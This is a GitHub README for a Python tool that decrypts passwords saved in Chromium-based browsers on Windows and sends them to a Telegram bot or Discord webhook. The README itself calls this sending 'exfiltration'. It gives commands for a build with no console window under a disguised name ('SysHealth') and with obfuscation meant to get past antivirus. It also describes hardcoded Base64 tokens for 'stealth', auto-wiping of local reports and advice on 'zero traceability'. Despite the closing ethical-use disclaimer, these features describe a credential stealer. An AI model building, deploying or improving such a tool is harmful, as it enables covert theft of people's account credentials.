# 🛡️ Chromium Credentials Auditor Suite

> [!NOTE]
>**English Version** | [Versión en Español](README.md)

<div align="center">

![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
![SQLite](https://img.shields.io/badge/SQLite-07405E?style=for-the-badge&logo=sqlite&logoColor=white)
![Telegram](https://img.shields.io/badge/Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)
![Discord](https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)

*An advanced suite for professional security audits and ethical pentesting in Windows environments.*

[Report Bug](https://github.com/ANONIMO432HZ/decrypt-chromium-suite/issues) | [Request Feature](https://github.com/ANONIMO432HZ/decrypt-chromium-suite/issues)

</div>

---

## 💻 System Compatibility

| Operating System | Supported Versions | Architecture |
| :--- | :--- | :--- |
| 🪟 **Windows** | Windows 10 / Windows 11 | x64 / x86 |
| 🌐 **Chromium** | v80 or higher (AES-GCM) | All |

---

## ✨ Supported Browsers

The suite automatically scans and decrypts the following targets:

* 🌐 **Google Chrome** (Canary, Beta, Stable)
* 🌐 **Microsoft Edge**
* 🦁 **Brave Browser**
* ⭕ **Opera & Opera GX**
* 📐 **Vivaldi**

---

## 🚀 Premium Features

* **📡 Modular Exfiltration**:
  * Instant report delivery via **Telegram Bot** or **Discord Webhooks**.
* **📊 Dynamic Reporting**:
  * Aesthetic reports in **Interactive HTML** or **CSV** files.
  * **Enriched Metadata**: Hostname, User, PID, and Version included in each report.
  * **Filtered Section**: Separate identification and visualization of non-HTTP credentials (local protocols, extensions, etc.).
* **🕵️ Stealth Architecture**:
  * Automatic cleaning of temporary databases and **Auto-Wipe** of the local report after exfiltration.
  * **Network Resilience**: Automatic retry system to ensure exfiltration despite connectivity issues.

---

## 🛠️ Technology Stack

| Component | Technology Used |
| :--- | :--- |
| **Language** | `Python 3.x` |
| **OS Security** | `Windows DPAPI` via `PyWin32` |
| **Cryptography** | `AES-GCM 256` via `PyCryptodomex` |
| **Communication** | `Telegram API` & `Discord Webhooks` |
| **Packaging** | `PyInstaller` (Standalone EXE) |

---

## ⚙️ Quick Start Guide

### 1. Dependency Installation

```bash
pip install -r requirements.txt
```

### 2. Master Commands

> **Generate Aesthetic HTML Report:**

```bash
python main.py -f html -o audit_report
```

> **Exfiltration via Telegram (Fast Mode):**

```bash
python main.py -t "TOKEN" -c "ID" # Supports Plain Text or Base64
```

### 🔑 Autonomous Use (Hardcoding)

You can pre-configure the script by editing the `HARDCODED CREDENTIALS` section in `main.py` (using **Base64** is recommended for better stealth). Once filled, you can run the `.exe` or the script without parameters, and data will be sent automatically.

---

## 📦 Professional Compilation and Obfuscation

To generate a robust, stealthy, and (optionally) obfuscated executable, use the included **`build.py`** script. This script automates the configuration for both PyInstaller and PyArmor.

```bash
# Recommended Use: single file, no console, and custom name
python build.py --name "SysHealth" --onefile --noconsole

# For a quick compilation without obfuscation (PyInstaller only)
python build.py --no-obf --name "ChromiumAuditor"
```

> [!TIP]
> You can see all customization options (icons, output folders, etc.) by running `python build.py --help`.

### 🛡️ Hardening and Obfuscation
To protect the binary against reverse engineering and antivirus, see the [Hybrid Obfuscation Guide](docs/OBFUSCATION_GUIDE.en.md).

### ⚙️ Advanced Compilation Guide
For detailed instructions on hybrid (Windows + WSL) or pure (Linux with Wine) flows, see the [Compilation Flows Guide](docs/COMPILATION_FLOWS.en.md).

## 🚦 CLI Argument Panel

| Short | Long | Description |
| :--- | :--- | :--- |
| `-f` | `--format` | Format: `html` or `csv`. |
| `-o` | `--output` | Base name for the output file. |
| **`-t`** | `--telegram-token` | Telegram bot token (Plain or B64). |
| **`-c`** | `--telegram-chatid` | Telegram chat ID (Plain or B64). |
| **`-d`** | `--discord` | Discord Webhook URL (Plain or B64). |
| `-s` | `--stealth` | Hides the console in real-time (identical to `.exe --noconsole`). |
| — | `--no-wipe` | Prevents automatic report wiping from local disk after sending. |
| — | `--clean` | Deletes all accumulated reports (`.html`, `.csv`) in the output folder. |
| `-v` | `--verbose` | Verbose mode (detailed debug logs). |

---

## 📡 Exfiltration Configuration

### 🤖 Telegram

You need two values: the **Bot Token** and the **Destination ID**.

**Bot Token** — Get it by talking to `@BotFather` on Telegram:

```text
1234567890:ABCdefGHIjklMNOpqrSTUvwxYZ
```

**Destination ID** — The `-c` / `HARDCODED_TG_ID` field accepts three types:

| Destination Type | ID Format | How to Get It |
| :--- | :--- | :--- |
| 💬 **Personal Chat** | Positive number `987654321` | Message `@userinfobot` |
| 👥 **Private Group** | Negative number `-1001234567890` | Add `@RawDataBot` to the group |
| 📢 **Private Channel** | Negative number `-1001234567890` | Add the bot as an admin to the channel |

> [!IMPORTANT]
> For **groups and channels**, add your bot as a member with **"Send Files"** permissions before use.
> For **personal chats**, first send a message to your bot to start the conversation.

### 🎮 Discord

Get the Webhook URL in: **Channel → Edit Channel → Integrations → Webhooks → Create Webhook**

```text
https://discord.com/api/webhooks/1234567890/SECRET_TOKEN_HERE
```

Paste that full URL into `-d` / `HARDCODED_DS_WEBHOOK`.

### 🔒 Operational Security Recommendation

For maximum discretion and zero traceability:

1. Create a **dedicated private channel** for each audit.
2. Add the bot as the only administrator of the channel.
3. Use the channel ID as `HARDCODED_TG_ID`.
4. **Delete the channel and the bot** after the audit is complete.

This way, if the token is compromised, the attacker only accesses an empty, deleted channel.

---

## ⚖️ Legal and Ethical Notice

> [!CAUTION]
> **THIS SOFTWARE IS FOR ETHICAL PENTESTING AND PROFESSIONAL AUDIT PURPOSES ONLY.**
> Using this tool to access systems without explicit permission from the owner is illegal. The author assumes no responsibility for the misuse of this suite.

---
